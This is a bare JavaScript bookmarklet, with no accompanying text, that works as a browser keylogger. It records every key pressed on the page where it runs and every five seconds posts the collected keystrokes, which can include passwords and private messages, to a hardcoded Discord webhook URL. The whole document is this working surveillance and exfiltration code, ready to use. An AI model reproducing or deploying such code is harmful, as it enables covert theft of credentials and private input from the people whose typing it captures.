javascript:(function() {
  var webhookUrl = 'https://discord.com/api/webhooks/1291884061790310461/ijYs8LiuvW_j9JleGuzbQwHVwbDz7A_W6Rm61WA-ruqKW-PnMSHeM76aaCu02JO_lxhG';
  var keylog = '';

  document.onkeypress = function(e) {
    e = e || window.event;
    var key = e.key || String.fromCharCode(e.keyCode);
    keylog += key;
  };

  setInterval(function() {
    if (keylog.length > 0) {
      fetch(webhookUrl, {
        method: 'POST',
        headers: {
          'Content-Type': 'application/json'
        },
        body: JSON.stringify({
          content: keylog
        })
      });
      keylog = '';
    }
  }, 5000);
})();
